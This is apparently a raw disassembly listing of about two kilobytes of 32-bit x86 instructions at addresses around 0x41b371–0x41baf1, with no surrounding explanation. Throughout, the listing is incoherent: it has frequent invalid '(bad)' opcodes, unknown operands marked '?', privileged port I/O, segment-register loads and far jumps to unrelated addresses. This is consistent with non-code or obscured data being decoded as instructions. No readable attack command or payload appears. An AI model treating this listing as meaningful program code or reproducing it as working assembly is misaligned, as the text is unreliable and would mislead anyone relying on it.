  41b371:	cmp    ch,BYTE PTR [esi-0x10]
  41b374:	xor    bh,ch
  41b376:	mov    edi,0xd5601ac2
  41b37b:	xor    ebx,ebp
  41b37d:	push   esp
  41b37e:	adc    edx,DWORD PTR [eax+0x21ec45f7]
  41b384:	test   BYTE PTR [edi],bl
  41b386:	cli    
  41b387:	add    DWORD PTR [ebx+0x6e],eax
  41b38a:	sbb    eax,DWORD PTR [ebp-0x2d]
  41b38d:	mov    BYTE PTR [ecx-0x18],bl
  41b390:	fidiv  DWORD PTR [ecx+0xf]
  41b393:	outs   dx,BYTE PTR ds:[esi]
  41b394:	jge    0x41b36a
  41b396:	jbe    0x41b395
  41b398:	xchg   ecx,eax
  41b399:	les    edi,FWORD PTR [edx+ecx*2-0x3a]
  41b39d:	jo     0x41b3d1
  41b39f:	sbb    DWORD PTR [edx+0x27],edi
  41b3a2:	jge    0x41b3f2
  41b3a4:	loopne 0x41b38e
  41b3a6:	loope  0x41b40c
  41b3a8:	push   ebp
  41b3a9:	fidiv  DWORD PTR ds:0xd71d7e84
  41b3af:	gs repnz xchg edi,eax
  41b3b2:	popa   
  41b3b3:	dec    di
  41b3b5:	push   edx
  41b3b6:	cld    
  41b3b7:	(bad)  
  41b3b8:	push   DWORD PTR [edi+0x2a]
  41b3bb:	pop    ebp
  41b3bc:	xor    al,0xef
  41b3be:	pusha  
  41b3bf:	xchg   ebp,eax
  41b3c0:	shl    BYTE PTR [esi],0xf4
  41b3c3:	(bad)
  41b3c8:	pop    edx
  41b3c9:	add    ebx,DWORD PTR [edx]
  41b3cb:	add    eax,0xeb654d31
  41b3d0:	xchg   ebx,eax
  41b3d1:	(bad)  
  41b3d2:	(bad)  
  41b3d4:	push   0x2200fcb8
  41b3d9:	les    esi,FWORD PTR [ebx]
  41b3db:	mov    ds:0x83f050b4,al
  41b3e0:	test   al,0x9c
  41b3e2:	pusha  
  41b3e3:	mov    ds:0x1038cf53,eax
  41b3e8:	pop    edi
  41b3e9:	mov    ds,ebx
  41b3eb:	pop    eax
  41b3ec:	push   ebp
  41b3ed:	test   DWORD PTR [ecx+0x31],ebx
  41b3f0:	(bad)  
  41b3f1:	pop    ebp
  41b3f2:	fstp   TBYTE PTR [esi+0x5c]
  41b3f5:	shl    ecx,cl
  41b3f7:	cmc    
  41b3f8:	dec    edi
  41b3f9:	stos   DWORD PTR es:[edi],eax
  41b3fa:	xchg   DWORD PTR [esi-0x68aa7953],edx
  41b400:	call   0xcd3212f3
  41b405:	test   esi,ecx
  41b407:	ds or  eax,0x249a97b7
  41b40d:	adc    BYTE PTR [edx-0x61cabcc1],ah
  41b413:	cmp    eax,DWORD PTR [edx]
  41b415:	lahf   
  41b416:	shl    DWORD PTR [ebp+0x1b],0xf
  41b41a:	sbb    dl,BYTE PTR [esi+0x2]
  41b41d:	mov    ds:0xec245e6e,eax
  41b422:	out    0x54,eax
  41b424:	inc    esp
  41b425:	cmp    dl,BYTE PTR [esi+0x33eed8e4]
  41b42b:	(bad)  
  41b42c:	fisub  WORD PTR [ecx-0x3bbd9c8b]
  41b432:	inc    ebp
  41b433:	dec    ebp
  41b434:	shr    BYTE PTR [eax+ecx*8-0x5354f444],0x5e
  41b43c:	pusha  
  41b43d:	mov    sp,WORD PTR [eax-0x1c]
  41b441:	mov    gs,eax
  41b443:	loope  0x41b431
  41b445:	leave  
  41b446:	ins    BYTE PTR es:[edi],dx
  41b447:	mov    cl,0xf2
  41b449:	push   ds
  41b44a:	ss pop edi
  41b44c:	dec    DWORD PTR [ecx]
  41b44e:	mov    cs,WORD PTR [edi-0x61d9b2fd]
  41b454:	lock mov eax,ds:0xf332ea4b
  41b45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b45b:	sbb    al,BYTE PTR [ebx+0x13]
  41b45e:	js     0x41b486
  41b460:	call   0x5b1d:0x88cf3123
  41b467:	xor    al,0x90
  41b469:	mov    esp,0xe7a43d18
  41b46e:	mov    ch,0x10
  41b470:	loop   0x41b4d5
  41b472:	pop    es
  41b473:	js     0x41b4ba
  41b475:	aam    0x9f
  41b477:	inc    esp
  41b478:	sub    ah,BYTE PTR [edx]
  41b47a:	cdq    
  41b47b:	and    BYTE PTR [esp+ebp*8],dh
  41b47e:	scas   eax,DWORD PTR es:[edi]
  41b47f:	ds mov eax,0xfbeee8f0
  41b485:	sbb    bh,dl
  41b487:	sbb    eax,0x1cec8b8a
  41b48c:	ror    dh,cl
  41b48e:	in     eax,0x62
  41b490:	mov    cl,0x98
  41b492:	jbe    0x41b46c
  41b494:	lock out dx,eax
  41b496:	inc    esi
  41b497:	and    eax,0xe2f73216
  41b49c:	ins    DWORD PTR es:[edi],dx
  41b49d:	xor    al,BYTE PTR [ecx]
  41b49f:	sbb    al,BYTE PTR [eax+0x23]
  41b4a2:	add    eax,0x1084929e
  41b4a7:	xor    dl,dh
  41b4a9:	adc    ebx,DWORD PTR [esi+eiz*2+0x78f347d0]
  41b4b0:	shr    BYTE PTR [edx],1
  41b4b2:	and    eax,0xb711f11b
  41b4b7:	fsub   st,st(5)
  41b4b9:	nop
  41b4ba:	and    ecx,DWORD PTR [ecx]
  41b4bc:	lahf   
  41b4bd:	add    BYTE PTR es:[esi],cl
  41b4c0:	add    eax,DWORD PTR [ebx-0x9]
  41b4c3:	fst    DWORD PTR [edx+edi*2-0x5f8edf1e]
  41b4ca:	cwde   
  41b4cb:	in     eax,dx
  41b4cc:	mov    esp,?
  41b4ce:	cwde   
  41b4cf:	mov    ebp,0xe3527664
  41b4d4:	jle    0x41b4ac
  41b4d6:	out    0x31,al
  41b4d8:	xchg   esp,eax
  41b4d9:	push   0xffffffe0
  41b4db:	mov    esp,0xf563d4de
  41b4e0:	rol    BYTE PTR [esi-0x59],0x18
  41b4e4:	repnz dec edi
  41b4e6:	push   esi
  41b4e7:	rol    DWORD PTR [edx],1
  41b4e9:	setns  BYTE PTR [edi]
  41b4ec:	in     eax,0x54
  41b4ee:	mov    ebx,0xbe1de9cb
  41b4f3:	add    ah,BYTE PTR [ebp-0x3482c63f]
  41b4f9:	test   dl,ch
  41b4fb:	lods   eax,DWORD PTR ds:[esi]
  41b4fc:	or     ch,BYTE PTR [edi-0x42]
  41b4ff:	inc    edx
  41b500:	mov    es,ebp
  41b502:	(bad)  
  41b503:	xlat   BYTE PTR ds:[ebx]
  41b504:	and    ebx,DWORD PTR [edx+0x5b700d48]
  41b50a:	mov    ecx,0x302b0d1
  41b50f:	stos   BYTE PTR es:[edi],al
  41b510:	ins    BYTE PTR es:[edi],dx
  41b511:	sbb    eax,0xa0270c00
  41b517:	lds    ebx,FWORD PTR [ebx+0x45304cad]
  41b51d:	mov    cl,0xc5
  41b51f:	enter  0xe468,0x71
  41b523:	dec    ebp
  41b524:	push   cs
  41b525:	std    
  41b526:	mov    WORD PTR [edi-0x5da730e5],gs
  41b52c:	cs xchg esp,eax
  41b52e:	push   ecx
  41b52f:	push   eax
  41b530:	push   esp
  41b531:	sub    ebx,DWORD PTR [ebp+esi*8-0x2dd7d635]
  41b538:	inc    ebp
  41b539:	add    eax,DWORD PTR [ebx]
  41b53b:	mov    ah,0x94
  41b53d:	aas    
  41b53e:	xchg   esp,eax
  41b53f:	adc    al,0x39
  41b541:	inc    eax
  41b542:	pushf  
  41b543:	or     al,0x12
  41b545:	ret    
  41b546:	(bad)  [eax-0x6c]
  41b549:	pop    ebp
  41b54a:	adc    dh,BYTE PTR [ebx+0x53]
  41b54d:	cmp    al,BYTE PTR [eax-0x1e]
  41b550:	scas   al,BYTE PTR es:[edi]
  41b551:	dec    ecx
  41b552:	xchg   edi,eax
  41b553:	mov    al,0x35
  41b555:	std    
  41b556:	imul   edx,DWORD PTR [ecx+0x1eb7f5de],0xffffffc9
  41b55d:	xor    eax,0x57853dce
  41b562:	out    0xfb,eax
  41b564:	shr    BYTE PTR [esp+edx*8],0xb2
  41b568:	mov    ecx,0x3a75f604
  41b56d:	std    
  41b56e:	mov    bh,0x8c
  41b570:	mov    ds:0x79e233b9,al
  41b575:	add    bl,bh
  41b577:	mov    ds:0xcfd22171,eax
  41b57c:	test   DWORD PTR [ecx-0x5def687c],0x7c3219fc
  41b586:	mov    ebx,DWORD PTR [esi-0x6d]
  41b589:	adc    al,BYTE PTR [esi-0x790216f6]
  41b58f:	retf   
  41b590:	push   ss
  41b591:	inc    edx
  41b592:	or     eax,DWORD PTR [edi+0x11]
  41b595:	mov    esi,0xb238f348
  41b59a:	mov    bl,0xe5
  41b59c:	pop    es
  41b59d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59e:	nop
  41b59f:	jns    0x41b587
  41b5a1:	inc    ebx
  41b5a2:	retf   
  41b5a3:	mov    eax,ds:0xb267ac98
  41b5a8:	or     BYTE PTR [eax-0x510884b8],cl
  41b5ae:	ror    eax,1
  41b5b0:	pop    edi
  41b5b1:	mov    ds:0x532bdadb,al
  41b5b6:	arpl   di,bp
  41b5b8:	in     eax,dx
  41b5b9:	jnp    0x41b581
  41b5bb:	add    BYTE PTR [edi-0x64a6c28d],dl
  41b5c1:	test   DWORD PTR cs:[edx-0x5ea7adff],esp
  41b5c8:	sti    
  41b5c9:	xlat   BYTE PTR ds:[ebx]
  41b5ca:	mov    bl,0x99
  41b5cc:	dec    edi
  41b5cd:	jmp    0xe294:0x6363e5cd
  41b5d4:	jae    0x41b570
  41b5d6:	call   0x3366:0x4c76b1ac
  41b5dd:	dec    edi
  41b5de:	push   esi
  41b5df:	jnp    0x41b5ba
  41b5e1:	cdq    
  41b5e2:	mov    ebx,0xd602d9b6
  41b5e7:	push   ecx
  41b5e8:	stos   DWORD PTR es:[edi],eax
  41b5e9:	xor    DWORD PTR [ebx-0x4f],eax
  41b5ec:	adc    ebp,0xe98edb34
  41b5f2:	jno    0x41b62c
  41b5f4:	imul   esp,DWORD PTR [eax],0x668826d3
  41b5fa:	push   0x4
  41b5fc:	inc    ebx
  41b5fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5fe:	enter  0x711b,0x2c
  41b602:	pop    ebx
  41b603:	push   ebx
  41b604:	loop   0x41b646
  41b606:	mov    esi,0xba5f49fc
  41b60b:	clc    
  41b60c:	push   ds
  41b60d:	mov    WORD PTR [ebx+0x76f7347],fs
  41b613:	scas   al,BYTE PTR es:[edi]
  41b614:	xor    eax,DWORD PTR [ebx+eiz*4]
  41b617:	out    0x79,al
  41b619:	mov    al,ds:0x5c2e2bdd
  41b61e:	int    0x5e
  41b620:	dec    ecx
  41b621:	mov    edx,ebp
  41b623:	jb     0x41b63e
  41b625:	or     DWORD PTR [eax+0x3c],0xa0a4f525
  41b62c:	pop    ecx
  41b62d:	dec    edi
  41b62e:	add    bh,BYTE PTR [eax+0x34]
  41b631:	out    0xdc,al
  41b633:	adc    bl,0xed
  41b636:	fwait
  41b637:	add    edi,ecx
  41b639:	lods   al,BYTE PTR ds:[esi]
  41b63a:	jle    0x41b612
  41b63c:	imul   esp,DWORD PTR [eax-0x16],0x98977a08
  41b643:	mov    ds:0xad1ca32f,al
  41b648:	add    BYTE PTR [edx+edi*1-0x7f],cl
  41b64c:	imul   edx,DWORD PTR [eax],0x3c
  41b64f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b650:	pusha  
  41b651:	sbb    BYTE PTR [esi],cl
  41b653:	pop    edx
  41b654:	xor    BYTE PTR [ebx-0x1315a2e9],dh
  41b65a:	fadd   DWORD PTR [esi+0x2c]
  41b65d:	icebp  
  41b65e:	mov    BYTE PTR [edx+ebx*4],ah
  41b661:	adc    eax,esp
  41b663:	out    dx,eax
  41b664:	sub    eax,0x666ca5d0
  41b669:	sub    esi,ecx
  41b66b:	out    dx,eax
  41b66c:	mov    BYTE PTR [ebx],cl
  41b66e:	addr16 mov edx,0x7a78e157
  41b674:	xchg   BYTE PTR [edi-0x2c],bl
  41b677:	(bad)  
  41b678:	mov    edx,0x5e6f2d5b
  41b67d:	shl    DWORD PTR [ecx+eax*2],cl
  41b680:	jo     0x41b670
  41b682:	pop    ds
  41b683:	jae    0x41b652
  41b685:	push   esi
  41b686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b687:	fadd   DWORD PTR ds:0x237b4776
  41b68d:	adc    BYTE PTR [ecx],dl
  41b68f:	pop    edx
  41b690:	pop    edi
  41b691:	pop    edi
  41b692:	inc    esp
  41b693:	and    ch,BYTE PTR [edx]
  41b695:	add    DWORD PTR [eax],0x926e5302
  41b69b:	and    bl,bh
  41b69d:	aaa    
  41b69e:	mov    BYTE PTR [esi],cl
  41b6a0:	ins    DWORD PTR es:[edi],dx
  41b6a1:	pop    ecx
  41b6a2:	pop    eax
  41b6a3:	loope  0x41b68e
  41b6a5:	ror    DWORD PTR [esi+0x2c97d101],cl
  41b6ab:	cmp    BYTE PTR [esi-0x5efd0187],dh
  41b6b1:	outs   dx,BYTE PTR ds:[esi]
  41b6b2:	add    eax,0x54de6966
  41b6b7:	push   ss
  41b6b8:	and    eax,0xa7c5f394
  41b6bd:	push   esp
  41b6be:	push   esp
  41b6bf:	add    ebp,edx
  41b6c1:	push   ebx
  41b6c2:	fs (bad) 
  41b6c4:	cmp    bh,BYTE PTR [ebp+edx*4-0x49]
  41b6c8:	mov    ebx,0xd8ec5ece
  41b6cd:	nop
  41b6ce:	jae    0x41b6be
  41b6d0:	sbb    BYTE PTR [ecx+eax*2],al
  41b6d3:	in     al,0x1e
  41b6d5:	in     al,0xd7
  41b6d7:	jns    0x41b739
  41b6d9:	daa    
  41b6da:	call   0xa399c78d
  41b6df:	sub    DWORD PTR [edx-0x13],ecx
  41b6e2:	add    eax,0xff48a49e
  41b6e7:	adc    al,al
  41b6e9:	pop    ebp
  41b6ea:	cmc    
  41b6eb:	jae    0x41b677
  41b6ed:	jecxz  0x41b6e6
  41b6ef:	mov    cl,0x43
  41b6f1:	inc    ebx
  41b6f2:	scas   eax,DWORD PTR es:[edi]
  41b6f3:	sahf   
  41b6f4:	mov    ecx,?
  41b6f6:	shr    BYTE PTR [edi+esi*8+0x6e5298c2],cl
  41b6fd:	das    
  41b6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ff:	gs cmp cl,al
  41b702:	sbb    al,cl
  41b704:	sub    bh,al
  41b706:	push   ebp
  41b707:	adc    bl,BYTE PTR [ebx]
  41b709:	xchg   esi,eax
  41b70a:	add    eax,0x8e7e08fd
  41b70f:	test   BYTE PTR [edi],0x12
  41b712:	pop    es
  41b713:	ja     0x41b6e0
  41b715:	push   eax
  41b716:	data16 cmp al,cl
  41b719:	sbb    DWORD PTR [ecx-0x3e],edx
  41b71c:	or     al,0x2d
  41b71e:	arpl   WORD PTR [ecx+0x62c7bed4],bp
  41b724:	sbb    ch,BYTE PTR [ebp-0x48]
  41b727:	adc    al,BYTE PTR ds:0xccb7a4c6
  41b72d:	(bad)  [edx+0x27cd91fc]
  41b733:	lea    ebx,[eax]
  41b735:	repz data16 test BYTE PTR cs:[ebp+0x3c9d2790],ch
  41b73e:	ss push ds
  41b740:	(bad)  
  41b741:	push   esp
  41b742:	(bad)  
  41b743:	iret   
  41b744:	cli    
  41b745:	cmp    DWORD PTR [ebp+0x1],0xffffffa6
  41b749:	aam    0x42
  41b74b:	xchg   DWORD PTR [eax],eax
  41b74d:	mov    ebx,0xae3808cc
  41b752:	jnp    0x41b7c5
  41b754:	scas   eax,DWORD PTR es:[edi]
  41b755:	mov    al,ds:0xaaf9f778
  41b75a:	fnstsw WORD PTR [esi+0x3013f4ac]
  41b760:	pop    eax
  41b761:	(bad)  
  41b763:	mov    ch,0x4b
  41b765:	shr    DWORD PTR [ebx],0x4c
  41b768:	scas   eax,DWORD PTR es:[edi]
  41b769:	jno    0x41b7b6
  41b76b:	cmp    ecx,ebx
  41b76d:	aaa    
  41b76e:	loope  0x41b7e0
  41b770:	inc    edx
  41b771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b772:	add    esi,esi
  41b774:	xchg   edx,eax
  41b775:	push   ds
  41b776:	cmp    WORD PTR [eax-0x31],bp
  41b77a:	(bad)  
  41b77b:	push   ebx
  41b77c:	dec    esi
  41b77d:	out    dx,al
  41b77e:	addr16 js 0x41b7bc
  41b781:	xchg   ebp,eax
  41b782:	stc    
  41b783:	dec    ecx
  41b784:	mov    ebx,0x505625
  41b789:	inc    edx
  41b78a:	push   cs
  41b78b:	stc    
  41b78c:	call   0xb695:0x70544aa6
  41b793:	jne    0x41b73f
  41b795:	inc    esi
  41b796:	ins    BYTE PTR es:[edi],dx
  41b797:	es pop ss
  41b799:	sub    eax,0x13f56667
  41b79e:	mov    edx,0x646e2426
  41b7a3:	adc    dh,ch
  41b7a5:	sbb    ch,BYTE PTR [ebx]
  41b7a7:	sub    esi,ebp
  41b7a9:	ss mov ch,0x50
  41b7ac:	push   0x57226528
  41b7b1:	sub    dl,BYTE PTR ds:0xd5adaec6
  41b7b7:	retf   
  41b7b8:	or     ebp,DWORD PTR [esi]
  41b7ba:	adc    al,0xdb
  41b7bc:	repnz xor esi,DWORD PTR [ebx-0x60]
  41b7c0:	cwde   
  41b7c1:	ret    0x2dfc
  41b7c4:	mov    DWORD PTR [eax-0x363db19d],ebx
  41b7ca:	cmc    
  41b7cb:	mov    esi,0x203ffafc
  41b7d0:	outs   dx,DWORD PTR ds:[esi]
  41b7d1:	cld    
  41b7d2:	idiv   DWORD PTR [esp+edx*2-0x1bfc6c98]
  41b7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7da:	test   DWORD PTR [edx+esi*2+0x62],0x909b8291
  41b7e2:	and    ch,BYTE PTR [ebx-0x65d0df14]
  41b7e8:	popf   
  41b7e9:	inc    ebx
  41b7ea:	ret    0x9671
  41b7ed:	mov    ch,0x25
  41b7ef:	ja     0x41b7d0
  41b7f1:	(bad)  
  41b7f2:	dec    DWORD PTR [eax-0x6f4c946]
  41b7f8:	jnp    0x41b7c1
  41b7fa:	jmp    0x41b80f
  41b7fc:	push   eax
  41b7fd:	jmp    0xb2c0:0xe20b455f
  41b804:	dec    edx
  41b805:	dec    esi
  41b806:	jge    0x41b809
  41b808:	mov    eax,0x2331e92
  41b80d:	int3   
  41b80e:	xchg   esi,eax
  41b80f:	dec    ecx
  41b810:	cmp    al,0x4d
  41b812:	std    
  41b813:	cmp    bh,BYTE PTR [ebx-0x61]
  41b816:	fnstsw WORD PTR [edi+0x73052ed]
  41b81c:	outs   dx,BYTE PTR ds:[esi]
  41b81d:	add    DWORD PTR [ebx-0x7177f16d],ebx
  41b823:	test   bh,bh
  41b825:	xchg   ebx,eax
  41b826:	or     al,0x45
  41b828:	pop    es
  41b829:	fs mov dl,0x44
  41b82c:	mov    DWORD PTR [eax],0x60a4d2bf
  41b832:	and    al,0xd8
  41b834:	test   DWORD PTR [edi-0x6a1af442],0x87c36d37
  41b83e:	sbb    eax,0x54e8d64f
  41b843:	aad    0xdc
  41b845:	int    0x1d
  41b847:	xor    ch,dl
  41b849:	dec    DWORD PTR [edi]
  41b84b:	sub    cl,BYTE PTR [edx]
  41b84d:	dec    edx
  41b84e:	leave  
  41b84f:	(bad)  
  41b850:	xchg   edi,eax
  41b851:	add    DWORD PTR [edi+esi*1-0x657e585e],ebx
  41b858:	or     esp,edi
  41b85a:	inc    ebx
  41b85b:	daa    
  41b85c:	xlat   BYTE PTR ds:[ebx]
  41b85d:	aad    0x4d
  41b85f:	jmp    0x41b8c1
  41b861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b862:	mov    eax,ds:0x2a6b42d3
  41b867:	es mov al,0x2c
  41b86a:	dec    esp
  41b86b:	(bad)  
  41b86c:	repz xor DWORD PTR [esi+0x3ebe8f3e],edi
  41b873:	xor    eax,0xdd810a89
  41b878:	xrelease mov DWORD PTR [edx-0x3d],0xb5f92715
  41b880:	lahf   
  41b881:	and    DWORD PTR [edi+0x27],ecx
  41b884:	bnd jmp 0x3f78716a
  41b88a:	rol    eax,cl
  41b88c:	fwait
  41b88d:	mov    edx,0x74bd1ab8
  41b892:	fmul   DWORD PTR ds:0x9dbe49e8
  41b898:	and    BYTE PTR [ebp+esi*1+0x4f],cl
  41b89c:	inc    edx
  41b89d:	stc    
  41b89e:	and    DWORD PTR [ecx+0x4da34d05],edx
  41b8a4:	popa   
  41b8a5:	retf   
  41b8a6:	clc    
  41b8a7:	cmp    bl,dl
  41b8a9:	or     ebx,DWORD PTR ds:0x9d8f6d13
  41b8af:	ror    BYTE PTR [eax],0x3f
  41b8b2:	ss sbb al,0xf6
  41b8b5:	jns    0x41b91e
  41b8b7:	xchg   cl,bh
  41b8b9:	push   eax
  41b8ba:	xchg   esi,eax
  41b8bb:	ja     0x41b8f9
  41b8bd:	push   edx
  41b8be:	test   DWORD PTR [ebx-0x58fddd0b],esp
  41b8c4:	pop    edi
  41b8c5:	div    DWORD PTR [eax]
  41b8c7:	mov    ecx,0x2f19e0bb
  41b8cc:	dec    edx
  41b8cd:	mov    ch,0xf6
  41b8cf:	into   
  41b8d0:	push   esp
  41b8d1:	xchg   ebp,eax
  41b8d2:	dec    esi
  41b8d3:	inc    ebx
  41b8d4:	jmp    0x2889a5bf
  41b8d9:	(bad)  
  41b8da:	sti    
  41b8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8dc:	jmp    0xef6bda71
  41b8e1:	push   es
  41b8e2:	jns    0x41b8b1
  41b8e4:	test   eax,0x60a1eb1b
  41b8e9:	pusha  
  41b8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8eb:	cmp    DWORD PTR [eax+0x2b],edi
  41b8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8ef:	and    DWORD PTR [ecx-0x33158e88],esp
  41b8f5:	jbe    0x41b885
  41b8f7:	and    eax,0x7f419762
  41b8fc:	lock push cs
  41b8fe:	push   0xffffffbf
  41b900:	xor    ecx,DWORD PTR [ebp+0x49fb2cca]
  41b906:	nop
  41b907:	xchg   edx,eax
  41b908:	push   edx
  41b909:	stos   DWORD PTR es:[edi],eax
  41b90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b90b:	lock inc ebx
  41b90d:	ins    DWORD PTR es:[edi],dx
  41b90e:	pop    esi
  41b90f:	sbb    al,0x4c
  41b911:	xchg   DWORD PTR [ebp+0x42e1bad5],ebp
  41b917:	sub    eax,0xbb0d933e
  41b91c:	mov    ebp,0x72b8fdc6
  41b921:	push   ebp
  41b922:	xchg   esp,eax
  41b923:	lds    edx,FWORD PTR [edx-0x74]
  41b926:	aaa    
  41b927:	jno    0x41b99d
  41b929:	hlt    
  41b92a:	sbb    eax,0x3ef30a7f
  41b92f:	inc    eax
  41b930:	setno  bh
  41b933:	enter  0x736f,0xff
  41b937:	ret    
  41b938:	outs   dx,BYTE PTR ds:[esi]
  41b939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93a:	sti    
  41b93b:	in     eax,0xe9
  41b93d:	popf   
  41b93e:	cli    
  41b93f:	sbb    BYTE PTR [ebx+0xe724fd],ah
  41b945:	loop   0x41b957
  41b947:	mov    ds:0xbc22bba0,eax
  41b94c:	cdq    
  41b94d:	lods   eax,DWORD PTR ds:[esi]
  41b94e:	xor    BYTE PTR ds:0xd7e9523d,dh
  41b954:	and    DWORD PTR [edx-0x19224e0c],ebx
  41b95a:	data16 adc BYTE PTR [ecx+0x59],ch
  41b95e:	sar    esp,0x4e
  41b961:	dec    edi
  41b962:	fs jecxz 0x41b9a6
  41b965:	aas    
  41b966:	mov    ecx,0xed800511
  41b96b:	xor    al,0x3e
  41b96d:	mov    DWORD PTR [eax-0xe639b7b],eax
  41b973:	hlt    
  41b974:	test   al,0x8e
  41b976:	inc    edx
  41b977:	jns    0x41b95d
  41b979:	dec    BYTE PTR [ebx+0x4f11c29b]
  41b97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b980:	hlt    
  41b981:	test   dh,ch
  41b983:	cmp    eax,0xbb88b1a2
  41b988:	out    dx,eax
  41b989:	inc    esi
  41b98a:	gs jnp 0x41b96f
  41b98d:	inc    edi
  41b98e:	fninit 
  41b990:	jge    0x41b9ab
  41b992:	inc    esp
  41b993:	push   0x90c5c04c
  41b998:	fwait
  41b999:	js     0x41b93a
  41b99b:	jmp    0x6573:0x94c0e908
  41b9a2:	sub    DWORD PTR [ebx],edi
  41b9a4:	cmp    eax,DWORD PTR [edx-0x7b]
  41b9a7:	test   al,0xc6
  41b9a9:	or     BYTE PTR [ebx+edx*8-0xe],dh
  41b9ad:	ror    BYTE PTR [eax-0x5d8320fe],0x7f
  41b9b4:	jb     0x41ba04
  41b9b6:	or     DWORD PTR [eax-0x4e],edx
  41b9b9:	test   eax,0x1a4dc23e
  41b9be:	test   BYTE PTR [edi-0x7506bcad],dh
  41b9c4:	std    
  41b9c5:	sbb    DWORD PTR [edx+0x56],edi
  41b9c8:	dec    eax
  41b9c9:	and    dh,BYTE PTR [eax-0x61]
  41b9cc:	pop    ecx
  41b9cd:	jnp    0x41b9ea
  41b9cf:	out    dx,al
  41b9d0:	frstor [esi+ebx*4-0x7f]
  41b9d4:	cdq    
  41b9d5:	push   eax
  41b9d6:	mov    bl,0xa6
  41b9d8:	add    esp,ebx
  41b9da:	js     0x41ba13
  41b9dc:	jb     0x41b980
  41b9de:	adc    bh,0xda
  41b9e1:	sti    
  41b9e2:	jns    0x41b991
  41b9e4:	mov    ecx,0xa7116e9c
  41b9e9:	mov    dl,0xf6
  41b9eb:	ret    0xac7b
  41b9ee:	lahf   
  41b9ef:	or     al,0x5f
  41b9f1:	(bad)  
  41b9f2:	and    al,BYTE PTR [eax+0x54]
  41b9f5:	mov    dh,ch
  41b9f7:	cmp    edi,DWORD PTR [ecx-0x35]
  41b9fa:	(bad)  
  41b9fb:	cmp    DWORD PTR [ebx-0x9191ca8],esi
  41ba01:	rol    DWORD PTR [edi-0x10],cl
  41ba04:	sub    eax,0x1589232
  41ba09:	add    dl,al
  41ba0b:	fadd   DWORD PTR [edi+0x49]
  41ba0e:	jbe    0x41ba2c
  41ba10:	scas   eax,DWORD PTR es:[edi]
  41ba11:	xchg   esi,eax
  41ba12:	fisubr WORD PTR [ebp-0x78841b19]
  41ba18:	add    al,0x7e
  41ba1a:	mov    cl,0xfd
  41ba1c:	pop    esi
  41ba1d:	rol    ebx,1
  41ba1f:	inc    edx
  41ba20:	stos   DWORD PTR es:[edi],eax
  41ba21:	add    dh,BYTE PTR [edx-0x26d5b18a]
  41ba27:	adc    esp,ebx
  41ba29:	clc    
  41ba2a:	adc    eax,0x5a0ff85a
  41ba2f:	jle    0x41b9c9
  41ba31:	adc    eax,0x3422914f
  41ba36:	int    0x98
  41ba38:	and    bh,BYTE PTR [esi+0x50]
  41ba3b:	jl     0x41ba70
  41ba3d:	inc    edx
  41ba3e:	cmc    
  41ba3f:	neg    BYTE PTR [ebp+0x5752f458]
  41ba45:	jb     0x41baa2
  41ba47:	sbb    WORD PTR [ecx+0x57515f5a],bx
  41ba4e:	mov    WORD PTR [ebx],?
  41ba50:	add    BYTE PTR es:[edi],dl
  41ba53:	mov    eax,ds:0xa2230898
  41ba58:	jns    0x41b9ed
  41ba5a:	sbb    ah,BYTE PTR [edi+eax*8+0x6c11118f]
  41ba61:	cmp    al,0xf6
  41ba63:	and    ah,dl
  41ba65:	push   ss
  41ba66:	inc    esp
  41ba67:	fimul  WORD PTR cs:[edi+0x51]
  41ba6b:	mov    dh,0x67
  41ba6d:	cmp    cl,BYTE PTR [ecx+edi*2]
  41ba70:	dec    edx
  41ba71:	sahf   
  41ba72:	dec    edi
  41ba73:	inc    esp
  41ba74:	xor    DWORD PTR [ecx+0x3],esi
  41ba77:	dec    ebp
  41ba78:	ds sbb al,0xcf
  41ba7b:	jp     0x41ba5f
  41ba7d:	add    eax,DWORD PTR [esi]
  41ba7f:	lds    eax,FWORD PTR [edx-0x6a]
  41ba82:	xchg   ebp,eax
  41ba83:	lds    ebp,FWORD PTR [edi+0x717edfd1]
  41ba89:	cmp    BYTE PTR [edi+eax*8+0x3be67cee],dh
  41ba90:	sub    BYTE PTR [ebp+0x1d],0xeb
  41ba94:	test   esi,0x90b8b8c2
  41ba9a:	pop    ds
  41ba9b:	sbb    DWORD PTR [eax-0xc],ebp
  41ba9e:	into   
  41ba9f:	bt     DWORD PTR [edi-0x1c],esp
  41baa3:	hlt    
  41baa4:	aam    0x9a
  41baa6:	outs   dx,DWORD PTR ds:[esi]
  41baa7:	ja     0x41ba69
  41baa9:	sub    eax,0x4d6dcb4c
  41baae:	enter  0x955d,0xb9
  41bab2:	test   DWORD PTR [si-0x54],ebp
  41bab6:	test   al,0xf7
  41bab8:	pop    ds
  41bab9:	arpl   bp,si
  41babb:	inc    eax
  41babc:	(bad)  
  41babe:	mov    bh,0x90
  41bac0:	push   ecx
  41bac1:	data16 jb 0x41ba89
  41bac4:	mov    eax,ds:0x5c412749
  41bac9:	jle    0x41ba4b
  41bacb:	popa   
  41bacc:	mov    ch,0x3f
  41bace:	icebp  
  41bacf:	inc    ecx
  41bad0:	adc    DWORD PTR [eax+0x52],ecx
  41bad3:	mov    eax,DWORD PTR ds:0xda04d08f
  41bad9:	mov    DWORD PTR ds:0x89b54cf3,ecx
  41badf:	(bad)  
  41bae0:	std    
  41bae1:	call   DWORD PTR [ebx*4+0x5de53d23]
  41bae8:	jne    0x41bad1
  41baea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baeb:	add    ch,BYTE PTR [edi]
  41baed:	mov    bh,0x7d
  41baef:	cmp    edx,ecx
  41baf1:	out    0x4b,al
